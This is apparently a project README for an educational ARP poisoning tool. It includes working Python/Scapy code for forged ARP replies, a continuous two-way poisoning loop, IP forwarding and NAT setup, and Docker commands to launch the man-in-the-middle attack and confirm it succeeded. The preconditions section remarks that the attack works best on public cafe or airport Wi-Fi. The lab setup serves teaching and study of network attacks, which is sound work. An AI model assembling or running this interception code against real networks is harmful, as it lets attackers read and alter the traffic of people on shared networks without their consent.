# ARP Poisoning Attack Tool (Educational Purpose Only)

> **Disclaimer:** This code and documentation are for educational purposes only. ARP Spoofing is illegal if used on networks without explicit permission. This project is intended to demonstrate how Man-in-the-Middle (MITM) attacks work and how to understand network vulnerabilities.

## Overview
This script performs an ARP Poisoning (Spoofing) attack using Python and Scapy. It establishes a Man-in-the-Middle (MITM) position by tricking a **Victim** and a **Gateway (Website/Router)** into sending their traffic through the **Attacker's** machine. This allows the attacker to intercept, view, or modify packets in transit.

---

## Preconditions
For this attack to work successfully, the following conditions must be met:

1. **Same Subnet:** The Attacker, Victim, and Gateway must be on the same Local Area Network (LAN). ARP packets are broadcast only within a subnet and do not travel across routers.
2. **IP Forwarding Enabled:** The attacker's machine must be configured to forward packets. If this is disabled, the victim will lose internet connection (DoS), alerting them to the attack.
    * *Command:* `echo 1 > /proc/sys/net/ipv4/ip_forward`
3. **Dynamic ARP Caching:** The victim’s device and the gateway must use dynamic ARP caching (accepting updates), which is standard behavior for most devices.
4. **No DAI (Dynamic ARP Inspection):** The network switch must not have DAI enabled.
    * *Note:* This attack works best in public environments like cafes or airport Wi-Fi, where advanced security features like DAI are rarely implemented.

---

## Workflow of the Attack

The script follows a specific workflow to configure the network and maintain the deception.

### 1. Enable IP Forwarding & NAT
Before attacking, we must configure the Linux kernel to act like a router.

```python
def enable_ip_forwarding():
    """ Enters the commands to enable packet forwarding and NAT """
    print("[*] Enabling IP Forwarding and NAT...")
    
    # 1. Enable Forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # 2. Configure NAT (Masquerade)
    os.system(f"iptables -t nat -A POSTROUTING -o {INTERFACE} -j MASQUERADE")
    os.system(f"iptables -A FORWARD -i {INTERFACE} -j ACCEPT")
```

echo 1:
Enables Linux packet forwarding. Even if the packet is not destined for the attacker, the OS forwards it instead of dropping it.

MASQUERADE (NAT):
Performs Network Address Translation. When the attacker forwards packets to the internet, their source IP becomes the attacker's IP.

Why this matters:
Ensures the router sends return traffic back to the attacker, not directly to the victim. Without NAT, the victim might bypass the MITM.

### 2. Get MAC Address
We need the hardware addresses (MAC) to construct valid Ethernet frames.

```python

def get_mac(ip):
    """ Sends an ARP request to get the MAC address of an IP """
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False, iface=INTERFACE)
    if ans:
        return ans[0][1].hwsrc
    return None
```


This part sends a broadcast ARP request ("Who has this IP?") to the entire network (ff:ff:ff:ff:ff:ff).

It waits for a reply to find the MAC address mapped to the Victim's IP and the Gateway's IP.

### 3. The Spoof 
This is the core of the attack where we corrupt the ARP cache.


```python 
def spoof(target_ip, spoof_ip, target_mac):
    """ Sends the malicious ARP packet (The 'Lie') """
    # op=2 is ARP Reply.
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=INTERFACE)
```

op=2 (ARP Reply): We use Opcode 2 to forcefully update the ARP table on the target machine, even though they never sent a request.

The Trick: We tell the Target (Victim) that the Spoof IP (Gateway) is located at OUR MAC address.

Scapy's Role: We do not specify hwsrc (Source MAC). Scapy automatically fills this with the attacker's MAC address, which completes the deception.


### 4. Running the Attack 
ARP entries expire after a short time. We must keep lying to maintain the connection.

```python 

try:
    while True:
        # Tell Victim that we are the Website
        spoof(VICTIM_IP, WEBSITE_IP, victim_mac)
        
        # Tell Website that we are the Victim
        spoof(WEBSITE_IP, VICTIM_IP, website_mac)
        
        time.sleep(2)
```

Continuous Spoofing: We enter a while True loop to continuously send packets.

Two-Way Deception: We must poison both the Victim and the Gateway to intercept full duplex traffic.

time.sleep(2): We send these packets every 2 seconds to ensure the ARP cache stays poisoned and doesn't revert to the real MAC address.


### 5. Restore (Cleanup)
When we stop the attack (Ctrl+C), we must be polite and fix the network.

```python 
def restore(dest_ip, source_ip, dest_mac, source_mac):
    # Send the CORRECT MAC address this time
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False, iface=INTERFACE)
    
```
If we simply exit, the victim will have the wrong MAC address cached and will lose internet access (DoS).

This function sends the correct MAC address (hwsrc=source_mac) to the victim and router.

We send it 4 times to ensure the packet is received and the tables are updated.

##  How to test it

Follow these steps to set up the environment, launch the ARP Spoofing attack, and verify the results.

### 1. Setup & Start Environment
Run the following command to build the Docker image and start the Attacker and Victim containers in the background.

```bash
docker-compose up -d --build
```

### 2. Launch the Attack
Open a terminal inside the **Attacker** container and run the python script.

```bash
# 1. Enter the attacker container
docker exec -it attacker bash

# 2. Run the ARP Poisoning script
# Usage: python main.py [command] [target_ip] [gateway_ip] [interface]
python main.py arp_pois 172.25.0.10 172.25.0.1 eth0
```
> **Note:** The script will run continuously. Keep this terminal open to maintain the attack.

### 3. Verify the Attack (Proof of Concept)
Open a **new terminal window** to check if the attack is working as intended.

#### A. Check ARP Spoofing (Identity Theft)
Check the **Victim's** ARP table to see if they have been fooled.

```bash
# Check Victim's ARP table
docker exec victim arp -a
```
**Success Criteria:**
1.  Look at the entry for the Gateway (`172.25.0.1`).
2.  Compare it to the Attacker's real MAC address (you can find it by running `docker exec attacker cat /sys/class/net/eth0/address`).
3.  If the **Gateway's MAC address** in the victim's table matches the **Attacker's MAC address**, the spoofing is successful.

#### B. Check Packet Delivery (Man-in-the-Middle)
Ensure that IP forwarding is enabled and the victim's traffic is being routed through the attacker correctly (not blocked).

```bash
# Ping Google DNS from the Victim container
docker exec victim ping -c 4 8.8.8.8
```
**Success Criteria:**
* You should see `64 bytes from 8.8.8.8...` (Successful replies).
* If you see "Request Timeout", IP forwarding is not working.

### 4. Cleanup
To stop the attack and remove all containers and networks:

1.  Press `Ctrl + C` in the Attacker terminal to stop the Python script.
2.  Run the following command in your main terminal:

```bash
docker-compose down
```

## Network Topology Diagram

```mermaid
graph TD
    %% Node Definitions: External Wide Area Network
    Internet((External WAN<br>Public DNS: 8.8.8.8))

    %% Subgraph: Docker Internal Bridge Network
    subgraph LocalNet ["🔒 Docker Custom Bridge Network (CIDR: 172.25.0.0/16)"]
        %% Style for the Subnet
        style LocalNet fill:#f4f7f6,stroke:#333,stroke-width:2px,color:#2c3e50

        %% Nodes: Network Entities
        Gateway["Virtual Default Gateway<br>IP: 172.25.0.1<br>Role: Packet Forwarding & Routing"]
        Victim["Target Host (Victim)<br>IP: 172.25.0.10<br>State: ARP Cache Poisoned"]
        Attacker["Adversary Node (Attacker)<br>IP: 172.25.0.20<br>Role: Man-in-the-Middle (MITM)"]

        %% Edge Connections (Links) WITH QUOTES ADDED
        Victim <==>|"L2 Adjacency<br>(Broadcast Domain)"| Attacker
        
        %% Traffic Flows WITH QUOTES ADDED
        Victim -.->|"Intended Traffic Path"| Gateway
        Attacker <-->|"Intercepted Traffic Path<br>(IP Forwarding)"| Gateway
    end

    %% Edge Connection: Gateway to Internet
    Gateway ===>|"Network Address Translation (NAT)"| Internet

    %% Styling
    style Gateway fill:#fff3cd,stroke:#ffc107,stroke-width:2px,color:#333
    style Victim fill:#d1e7dd,stroke:#198754,stroke-width:2px,color:#333
    style Attacker fill:#f8d7da,stroke:#dc3545,stroke-width:2px,color:#333
    style Internet fill:#e2e3e5,stroke:#6c757d,color:#333
```


